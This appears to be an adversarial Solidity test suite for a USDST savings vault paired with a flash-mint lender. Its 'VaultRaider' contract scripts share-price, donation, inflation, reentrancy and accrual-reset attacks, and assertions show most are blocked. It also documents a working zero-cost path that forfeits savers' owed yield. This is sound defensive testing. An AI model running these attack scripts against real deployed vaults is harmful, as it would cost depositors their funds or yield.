// SPDX-License-Identifier: MIT
//
// ADVERSARIAL: FlashMint x SaveUSDSTVault (share-price surface)
//
// Mainnet-shaped: managedAssets 1,672,886 / shares 1,663,340 (rate 1.00574),
// rewardDistributor holding 14,487 USDST, perSecondSavingsRate 1.0000000015/s,
// FlashMint maxLoan 2,000,000e18 (= 1.2x the whole vault).

import "../../concrete/BaseCodeCollection.sol";
import "../../abstract/ERC20/IERC20.sol";
import "../../abstract/ERC20/access/Authorizable.sol";
import "../../concrete/Tokens/Token.sol";
import "../../concrete/Savings/SaveUSDSTVault.sol";
import "../../concrete/Flash/FlashMint.sol";

contract User {
    function do(address a, string f, variadic args) public returns (variadic) {
        return address(a).call(f, args);
    }
}

/// @notice Scripted flash-mint borrower aimed at the savings vault.
contract VaultRaider {
    FlashMint public lender;
    SaveUSDSTVault public vault;
    address public usdst;
    address public distributor;

    uint public mode;
    uint public sharesGot;
    uint public assetsBack;
    uint public depositAmt;
    string public innerErr;

    function init(address _lender, address _vault, address _usdst, address _distributor) public {
        lender = FlashMint(_lender);
        vault = SaveUSDSTVault(_vault);
        usdst = _usdst;
        distributor = _distributor;
    }

    function attack(uint _mode, uint amount) public {
        mode = _mode;
        sharesGot = 0;
        assetsBack = 0;
        innerErr = "";
        lender.flashLoan(address(this), amount, "raid");
    }

    function onFlashMint(address _token, uint amount, uint fee, variadic data) external returns (string) {
        require(msg.sender == address(lender), "raider: bad lender");
        depositAmt = amount;

        if (mode == 1) {
            // deposit(assets) -> redeem(shares): floor on both legs
            IERC20(usdst).approve(address(vault), amount);
            sharesGot = vault.deposit(amount, address(this));
            uint b0 = IERC20(usdst).balanceOf(address(this));
            vault.redeem(sharesGot, address(this), address(this));
            assetsBack = IERC20(usdst).balanceOf(address(this)) - b0;
        } else if (mode == 2) {
            // deposit(assets) -> withdraw(maxWithdraw): shows the round trip cannot get `amount` back
            IERC20(usdst).approve(address(vault), amount);
            sharesGot = vault.deposit(amount, address(this));
            uint b0 = IERC20(usdst).balanceOf(address(this));
            uint mw = vault.maxWithdraw(address(this));
            depositAmt = mw;
            vault.withdraw(mw, address(this), address(this));
            assetsBack = IERC20(usdst).balanceOf(address(this)) - b0;
        } else if (mode == 3) {
            // mint(shares) -> redeem(shares): previewMint rounds assets UP
            uint want = vault.convertToShares(amount);
            IERC20(usdst).approve(address(vault), amount);
            uint paid = vault.mint(want, address(this));
            depositAmt = paid;
            sharesGot = want;
            uint b0 = IERC20(usdst).balanceOf(address(this));
            vault.redeem(want, address(this), address(this));
            assetsBack = IERC20(usdst).balanceOf(address(this)) - b0;
        } else if (mode == 4) {
            // donate then immediately redeem an existing position: min() must ignore the donation
            IERC20(usdst).transfer(address(vault), amount);
        } else if (mode == 5) {
            // fund the reward distributor mid-tx and force an accrual pull
            IERC20(usdst).transfer(distributor, amount);
            try vault.accrue() { } catch Error(string e) { innerErr = e; }
        } else if (mode == 6) {
            // free lastAccrual reset: touch the vault with a deposit+redeem round trip
            IERC20(usdst).approve(address(vault), amount);
            sharesGot = vault.deposit(amount, address(this));
            uint b0 = IERC20(usdst).balanceOf(address(this));
            vault.redeem(sharesGot, address(this), address(this));
            assetsBack = IERC20(usdst).balanceOf(address(this)) - b0;
        } else if (mode == 7) {
            // attempt: name the vault as the flash-mint receiver so FlashMint burns ITS balance
            try lender.flashLoan(address(vault), 1e18, "") { }
            catch Error(string e) { innerErr = e; }
        }

        return "FlashMint.onFlashMint";
    }
}

contract Describe_Adv_Peg_SaveVault is Authorizable {

    uint public INFINITY = 2 ** 256 - 1;
    uint public WAD = 1e18;
    uint public MAXLOAN      = 2000000e18;
    uint public VAULT_SHARES = 1663340e18;
    uint public VAULT_MANAGED= 1672886e18;
    uint public DISTRIB_BAL  = 14487e18;
    uint public MAINNET_RATE = 1000000001500000000000000000;

    Mercata m;
    FlashMint fm;
    SaveUSDSTVault vault;
    AdminRegistry areg;
    Token USDST;
    User saver;
    User distributor;

    function beforeAll() public {
        bypassAuthorizations = true;
        m = new Mercata();
        areg = m.adminRegistry();

        USDST = Token(m.tokenFactory().createToken("USDST","USD Stable",[],[],[],"USDST",0,18));
        USDST.setStatus(2);

        vault = new SaveUSDSTVault(address(this));
        vault.initialize(address(USDST), "Save USDST", "saveUSDST");

        saver = new User();
        USDST.mint(address(saver), VAULT_SHARES);
        saver.do(address(USDST), "approve", address(vault), INFINITY);
        saver.do(address(vault), "deposit(uint256,address)", VAULT_SHARES, address(saver));

        uint topUp = VAULT_MANAGED - VAULT_SHARES;
        USDST.mint(address(this), topUp);
        IERC20(address(USDST)).transfer(address(vault), topUp);
        vault.recordRewardTransfer(topUp);

        distributor = new User();
        USDST.mint(address(distributor), DISTRIB_BAL);
        distributor.do(address(USDST), "approve", address(vault), INFINITY);
        vault.setRewardDistributor(address(distributor));
        vault.setPerSecondSavingsRate(MAINNET_RATE);

        fm = new FlashMint(address(areg));
        areg.addWhitelist(address(USDST), "mint", address(fm));
        areg.addWhitelist(address(USDST), "burn", address(fm));
        fm.initialize(address(USDST), address(m.feeCollector()), MAXLOAN);
        fm.setWhitelistEnabled(false);

        log("── fixture ──");
        log("vault managed  = " + string(vault.totalAssets()));
        log("vault shares   = " + string(vault.totalSupply()));
        log("vault live bal = " + string(USDST.balanceOf(address(vault))));
        log("exchangeRate   = " + string(vault.exchangeRate()));
        log("maxLoan        = " + string(fm.maxLoan() / WAD));
    }

    function beforeEach() public { }

    // ─────────────────────────────────────────────────────────────────────
    // Q3  SHARE PRICE
    // ─────────────────────────────────────────────────────────────────────

    /// deposit(2,000,000) then redeem in the same transaction.
    function it_s1_deposit_redeem_round_trip_extracts_nothing() public {
        VaultRaider r = new VaultRaider();
        r.init(address(fm), address(vault), address(USDST), address(distributor));
        uint bankroll = 1e18;
        USDST.mint(address(r), bankroll);

        uint rate0 = vault.exchangeRate();
        uint mgd0 = vault.totalAssets();
        uint sup0 = vault.totalSupply();
        uint saverValue0 = vault.convertToAssets(IERC20(address(vault)).balanceOf(address(saver)));

        r.attack(1, MAXLOAN);

        log("── s1 deposit->redeem, 2,000,000 flash ──");
        log("deposited (wei)          = " + string(MAXLOAN));
        log("shares minted            = " + string(r.sharesGot()));
        log("assets returned (wei)    = " + string(r.assetsBack()));
        log("raider net (wei)         = -" + string(MAXLOAN - r.assetsBack()));
        log("bankroll before/after    = " + string(bankroll) + " / " + string(USDST.balanceOf(address(r))));
        log("rate before/after        = " + string(rate0) + " / " + string(vault.exchangeRate()));
        log("managed before/after     = " + string(mgd0) + " / " + string(vault.totalAssets()));
        log("supply before/after      = " + string(sup0) + " / " + string(vault.totalSupply()));
        log("saver value before/after = " + string(saverValue0) + " / " + string(vault.convertToAssets(IERC20(address(vault)).balanceOf(address(saver)))));

        require(r.assetsBack() <= MAXLOAN, "BROKEN: round trip minted value");
        require(vault.exchangeRate() >= rate0, "BROKEN: savers were diluted");
        require(vault.convertToAssets(IERC20(address(vault)).balanceOf(address(saver))) >= saverValue0,
                "BROKEN: existing shareholder lost value");
    }

    /// deposit then withdraw(assets): previewWithdraw rounds shares UP against the caller.
    function it_s2_deposit_withdraw_round_trip_is_strictly_worse() public {
        VaultRaider r = new VaultRaider();
        r.init(address(fm), address(vault), address(USDST), address(distributor));
        USDST.mint(address(r), 1e18);

        uint rate0 = vault.exchangeRate();
        r.attack(2, MAXLOAN);
        uint sharesLeft = IERC20(address(vault)).balanceOf(address(r));

        log("── s2 deposit->withdraw ──");
        log("deposited (wei)          = " + string(MAXLOAN));
        log("shares minted on deposit = " + string(r.sharesGot()));
        log("maxWithdraw after deposit= " + string(r.depositAmt()) + "  (< deposit: withdraw(2,000,000e18) reverts 'withdraw exceeds max')");
        log("assets withdrawn (wei)   = " + string(r.assetsBack()));
        log("shortfall vs deposit     = " + string(MAXLOAN - r.assetsBack()));
        log("shares LEFT stranded     = " + string(sharesLeft) + "  (previewWithdraw rounds UP)");
        log("rate before/after        = " + string(rate0) + " / " + string(vault.exchangeRate()));
        require(r.assetsBack() < MAXLOAN, "BROKEN: withdraw path recovered the full deposit");
        require(vault.exchangeRate() >= rate0, "vault must not lose on the round trip");
    }

    /// mint(shares) then redeem(shares): previewMint rounds assets UP against the caller.
    function it_s3_mint_redeem_round_trip_is_strictly_worse() public {
        VaultRaider r = new VaultRaider();
        r.init(address(fm), address(vault), address(USDST), address(distributor));
        USDST.mint(address(r), 1e18);

        uint rate0 = vault.exchangeRate();
        r.attack(3, MAXLOAN);

        log("── s3 mint(shares)->redeem(shares) ──");
        log("shares requested         = " + string(r.sharesGot()));
        log("assets paid IN  (roundUp)= " + string(r.depositAmt()));
        log("assets paid OUT (floor)  = " + string(r.assetsBack()));
        log("raider loss (wei)        = " + string(r.depositAmt() - r.assetsBack()));
        log("rate before/after        = " + string(rate0) + " / " + string(vault.exchangeRate()));
        require(r.assetsBack() <= r.depositAmt(), "BROKEN: mint/redeem printed value");
        require(vault.exchangeRate() >= rate0, "savers must not be diluted");
    }

    /// Donation attack: min(_managedAssets, liveBalance) must ignore a 2,000,000 donation.
    function it_s4_donation_is_ignored_and_unrepayable() public {
        uint mgd0 = vault.totalAssets();
        uint live0 = USDST.balanceOf(address(vault));
        uint rate0 = vault.exchangeRate();

        VaultRaider r = new VaultRaider();
        r.init(address(fm), address(vault), address(USDST), address(distributor));
        string err = "";
        try r.attack(4, MAXLOAN) { } catch Error(string e) { err = e; }

        log("── s4 flash-minted donation ──");
        log("revert                   = " + err);
        log("managed before/after     = " + string(mgd0) + " / " + string(vault.totalAssets()));
        log("live before/after        = " + string(live0) + " / " + string(USDST.balanceOf(address(vault))));
        log("rate before/after        = " + string(rate0) + " / " + string(vault.exchangeRate()));
        require(err == "FlashMint: not repaid", "must be blocked by the repayment check");

        // and with real capital the donation is pure loss to the donor: min() keeps pricing at managed
        User donor = new User();
        USDST.mint(address(donor), 500000e18);
        donor.do(address(USDST), "transfer", address(vault), 500000e18);
        log("after 500,000 REAL donation:");
        log("  managed                = " + string(vault.totalAssets()));
        log("  live                   = " + string(USDST.balanceOf(address(vault))));
        log("  rate                   = " + string(vault.exchangeRate()));
        log("  previewDeposit(1e18)   = " + string(vault.previewDeposit(1e18)));
        require(vault.totalAssets() == mgd0, "donation must not enter managedAssets");
        require(vault.exchangeRate() == rate0, "donation must not move the price");
    }

    /// First-depositor / inflation rounding on a fresh vault, with a flash-sized donation.
    function it_s5_first_depositor_inflation_is_blocked_by_min() public {
        SaveUSDSTVault fresh = new SaveUSDSTVault(address(this));
        fresh.initialize(address(USDST), "Save2", "s2");

        User attacker = new User();
        User victim = new User();
        USDST.mint(address(attacker), 1 + MAXLOAN);
        attacker.do(address(USDST), "approve", address(fresh), INFINITY);
        attacker.do(address(fresh), "deposit(uint256,address)", 1, address(attacker));
        attacker.do(address(USDST), "transfer", address(fresh), MAXLOAN);

        log("── s5 first-depositor inflation ──");
        log("attacker shares          = " + string(IERC20(address(fresh)).balanceOf(address(attacker))));
        log("donation                 = " + string(MAXLOAN));
        log("fresh managed            = " + string(fresh.totalAssets()));
        log("fresh live               = " + string(USDST.balanceOf(address(fresh))));
        log("fresh rate               = " + string(fresh.exchangeRate()));
        log("previewDeposit(1000e18)  = " + string(fresh.previewDeposit(1000e18)));

        USDST.mint(address(victim), 1000e18);
        victim.do(address(USDST), "approve", address(fresh), INFINITY);
        victim.do(address(fresh), "deposit(uint256,address)", 1000e18, address(victim));
        uint vShares = IERC20(address(fresh)).balanceOf(address(victim));
        log("victim shares            = " + string(vShares));
        log("victim redeemable        = " + string(fresh.convertToAssets(vShares)));
        require(vShares == 1000e18, "victim must get 1:1 shares, min() blocks the inflation");
        require(fresh.convertToAssets(vShares) == 1000e18, "victim value intact");
    }

    /// The "insolvent" gate and pricingAssets==0: can a flash mint force it?
    function it_s6_insolvent_gate_cannot_be_forced() public {
        log("── s6 insolvency / pricingAssets==0 ──");
        log("pricingAssets = min(managed, live) = " + string(vault.totalAssets()) + " vs live " + string(USDST.balanceOf(address(vault))));

        // Every attacker-reachable state change raises BOTH managed and live by the same delta,
        // so min() can never be driven to 0 while shares exist. Enumerate the write paths:
        //   _deposit  : managed += delta, live += delta
        //   _accrue   : managed += credited, live += credited
        //   _withdraw : managed -= shares*M/S >= live reduction
        // A flash mint adds nothing new. Demonstrate the deposit leg keeps them locked together:
        VaultRaider r = new VaultRaider();
        r.init(address(fm), address(vault), address(USDST), address(distributor));
        USDST.mint(address(r), 1e18);
        r.attack(1, MAXLOAN);
        require(USDST.balanceOf(address(vault)) >= vault.totalAssets(), "live must stay >= managed");
        log("after 2,000,000 round trip: live - managed = " + string(USDST.balanceOf(address(vault)) - vault.totalAssets()));

        // and a zero-asset deposit / dust deposit is rejected rather than mispriced
        User u = new User();
        USDST.mint(address(u), 10e18);
        u.do(address(USDST), "approve", address(vault), INFINITY);
        string err = "";
        try u.do(address(vault), "deposit(uint256,address)", 0, address(u)) { }
        catch Error(string e) { err = e; }
        log("deposit(0) revert        = " + err);
        require(err != "", "zero deposit must revert");
    }

    /// Can FlashMint burn tokens the vault counts as _managedAssets?
    function it_s7_flashmint_cannot_burn_the_vaults_balance() public {
        uint live0 = USDST.balanceOf(address(vault));
        uint mgd0 = vault.totalAssets();

        // direct: name the vault as receiver
        string err1 = "";
        try fm.flashLoan(address(vault), 1e18, "") { }
        catch Error(string e) { err1 = e; }

        // nested: name the vault as receiver from inside a live callback
        VaultRaider r = new VaultRaider();
        r.init(address(fm), address(vault), address(USDST), address(distributor));
        USDST.mint(address(r), 10e18);
        r.attack(7, 1e18);

        log("── s7 burn-the-vault attempts ──");
        log("direct  receiver=vault revert = " + err1);
        log("nested  receiver=vault revert = " + r.innerErr());
        log("vault live before/after       = " + string(live0) + " / " + string(USDST.balanceOf(address(vault))));
        log("vault managed before/after    = " + string(mgd0) + " / " + string(vault.totalAssets()));
        require(err1 == "FlashMint: receiver must be caller", "direct third-party receiver must be rejected");
        require(r.innerErr() == "FlashMint: reentrant", "nested attempt hits the reentrancy guard first");
        require(USDST.balanceOf(address(vault)) == live0, "vault live balance untouched");
        require(vault.totalAssets() == mgd0, "vault managed untouched");
    }

    /// Impairment (live < managed): unreachable via FlashMint, but if it ever happens the
    /// managedReduction branch preserves the impairment ratio forever and bricks the owner tools.
    function it_s8_impairment_branch_is_unreachable_but_permanent() public {
        // Simulated with token-admin burn authority (which FlashMint does NOT have on the
        // vault's balance — see s7). This measures the blast radius, not a reachable attack.
        SaveUSDSTVault v = new SaveUSDSTVault(address(this));
        v.initialize(address(USDST), "Imp", "imp");

        User a = new User();
        User b = new User();
        USDST.mint(address(a), 1000e18);
        USDST.mint(address(b), 1000e18);
        a.do(address(USDST), "approve", address(v), INFINITY);
        b.do(address(USDST), "approve", address(v), INFINITY);
        a.do(address(v), "deposit(uint256,address)", 1000e18, address(a));
        b.do(address(v), "deposit(uint256,address)", 1000e18, address(b));

        log("── s8 impairment blast radius ──");
        log("managed/live/rate before  = " + string(v.totalAssets()) + " / " + string(USDST.balanceOf(address(v))) + " / " + string(v.exchangeRate()));

        // simulate a 40% impairment
        USDST.burn(address(v), 800e18);
        log("managed/live/rate after   = " + string(v.totalAssets()) + " / " + string(USDST.balanceOf(address(v))) + " / " + string(v.exchangeRate()));

        // a withdraws: pays out at the impaired price but managed drops by the un-impaired share
        a.do(address(v), "redeem(uint256,address,address)", 1000e18, address(a), address(a));
        log("after a exits:");
        log("  managed                 = " + string(v.totalAssets()));
        log("  live                    = " + string(USDST.balanceOf(address(v))));
        log("  rate                    = " + string(v.exchangeRate()));
        log("  a received              = " + string(USDST.balanceOf(address(a))));

        require(v.totalAssets() > USDST.balanceOf(address(v)), "impairment persists: managed stays overstated");

        // owner tooling is bricked while impaired
        string e1 = "";
        try v.recoverStrayAssets(address(this)) { } catch Error(string e) { e1 = e; }
        string e2 = "";
        try v.recordRewardTransfer(1) { } catch Error(string e) { e2 = e; }
        log("  recoverStrayAssets      = " + e1);
        log("  recordRewardTransfer(1) = " + e2);
        require(e1 != "", "recoverStrayAssets bricked while impaired");
        require(e2 != "", "recordRewardTransfer bricked while impaired");
    }

    /// recordRewardTransfer's stray check, and whether a flash-minted stray can be over-credited.
    function it_s9_recordRewardTransfer_stray_guard_holds() public {
        uint mgd0 = vault.totalAssets();
        uint live0 = USDST.balanceOf(address(vault));
        uint stray = live0 - mgd0;
        log("── s9 recordRewardTransfer ──");
        log("stray sitting in vault    = " + string(stray));

        string err = "";
        try vault.recordRewardTransfer(stray + 1) { } catch Error(string e) { err = e; }
        log("credit stray+1 revert     = " + err);
        require(err == "SaveUSDST: insufficient stray", "cannot credit more than actually arrived");

        if (stray > 0) {
            uint rate0 = vault.exchangeRate();
            vault.recordRewardTransfer(stray);
            log("credited stray            = " + string(stray));
            log("rate before/after         = " + string(rate0) + " / " + string(vault.exchangeRate()));
            require(vault.exchangeRate() > rate0, "credited stray raises the price for savers");
        }
    }

    /// Accrual window: _accrue() stamps lastAccrual unconditionally and there is NO backlog, so
    /// whoever touches the vault while the distributor is short burns the shortfall permanently.
    /// NOTE: accrue() is already permissionless and zero-capital, so FlashMint adds nothing here.
    /// Both triggers are measured side by side.
    function it_s10_accrual_window_reset_destroys_yield_no_backlog() public {
        // dry out the distributor's allowance so `available` == 0
        distributor.do(address(USDST), "approve", address(vault), 0);

        fastForward(2592000);   // one month of owed accrual
        (uint target, uint funded) = vault.pendingAccrual();
        uint mgd0 = vault.totalAssets();
        uint rate0 = vault.exchangeRate();

        log("── s10 accrual-window reset (no backlog) ──");
        log("owed target after 30d     = " + string(target));
        log("funded (allowance 0)      = " + string(funded));

        // a zero-capital flash mint round trip is enough to stamp lastAccrual
        VaultRaider r = new VaultRaider();
        r.init(address(fm), address(vault), address(USDST), address(distributor));
        USDST.mint(address(r), 1e18);
        uint mgdPre = vault.totalAssets();
        r.attack(6, MAXLOAN);

        (uint target2, uint funded2) = vault.pendingAccrual();
        log("after the flash round trip:");
        log("  pending target          = " + string(target2));
        log("  managed delta (wei)     = " + string(vault.totalAssets() - mgdPre) + "  (rounding only, no yield)");
        log("  rate                    = " + string(vault.exchangeRate()) + " (was " + string(rate0) + ")");
        log("  yield destroyed (wei)   = " + string(target));
        log("  cost to the attacker    = flash fee only (feeBps 0 => 0)");
        require(target > 0, "there was real yield owed");
        require(target2 == 0, "lastAccrual was stamped, the window is gone");
        require(vault.totalAssets() - mgdPre < 1000000, "no yield was credited, only wei-scale rounding");
        require(vault.exchangeRate() == rate0, "savers saw no rate increase");

        // re-arm the distributor and show the yield does NOT come back (no backlog)
        distributor.do(address(USDST), "approve", address(vault), INFINITY);
        uint credited = vault.accrue();
        log("  credited after re-arm   = " + string(credited) + " (backlog is not replayed)");
        require(credited == 0, "no backlog: the window's yield is permanently forfeited");

        // same destruction with NO flash mint at all -- accrue() is permissionless
        distributor.do(address(USDST), "approve", address(vault), 0);
        fastForward(2592000);
        (uint target3, uint funded3) = vault.pendingAccrual();
        User nobody = new User();
        nobody.do(address(vault), "accrue");
        (uint target4, uint funded4) = vault.pendingAccrual();
        log("zero-capital accrue() by a random EOA:");
        log("  owed before             = " + string(target3));
        log("  owed after              = " + string(target4));
        require(target3 > 0 && target4 == 0, "FlashMint is not needed: accrue() alone does it");
    }

    /// Mainnet-depth partial-funding forfeit: the distributor holds 14,487 USDST against
    /// ~218 USDST/day of owed accrual, so it runs dry and any toucher burns the shortfall.
    function it_s11_partial_funding_forfeits_the_shortfall() public {
        distributor.do(address(USDST), "approve", address(vault), INFINITY);
        uint distBal = USDST.balanceOf(address(distributor));

        fastForward(2592000 * 6);   // ~180 days with nobody touching the vault
        (uint target, uint funded) = vault.pendingAccrual();

        log("── s11 partial-funding forfeit ──");
        log("distributor balance       = " + string(distBal));
        log("owed target after 180d    = " + string(target));
        log("fundable now              = " + string(funded));
        log("shortfall burned on touch = " + string(target - funded));

        uint credited = vault.accrue();
        (uint target2, uint funded2) = vault.pendingAccrual();
        log("credited                  = " + string(credited));
        log("owed after                = " + string(target2) + "  (shortfall is NOT carried forward)");
        require(credited == funded, "only the fundable part is credited");
        require(target2 == 0, "the rest is forfeited, not queued");
        require(target - funded > 0, "there was a real shortfall at mainnet distributor depth");
    }

    /// Funding the distributor mid-flash-mint: can _accrue over-pull past targetAmount?
    function it_s12_accrual_pull_is_capped_by_target() public {
        distributor.do(address(USDST), "approve", address(vault), INFINITY);
        fastForward(86400);
        (uint target, uint funded) = vault.pendingAccrual();
        uint mgd0 = vault.totalAssets();

        VaultRaider r = new VaultRaider();
        r.init(address(fm), address(vault), address(USDST), address(distributor));
        string err = "";
        try r.attack(5, MAXLOAN) { } catch Error(string e) { err = e; }

        log("── s12 distributor funded by flash mint ──");
        log("target (1 day)            = " + string(target));
        log("revert                    = " + err);
        log("managed before/after      = " + string(mgd0) + " / " + string(vault.totalAssets()));
        require(err == "FlashMint: not repaid", "the donated principal cannot be recovered");
        require(vault.totalAssets() == mgd0, "state rolled back");

        // control: with real capital the pull is still capped at target, never more
        uint credited = vault.accrue();
        log("credited (own capital)    = " + string(credited));
        require(credited <= target, "accrual can never exceed the rate target");
    }
}
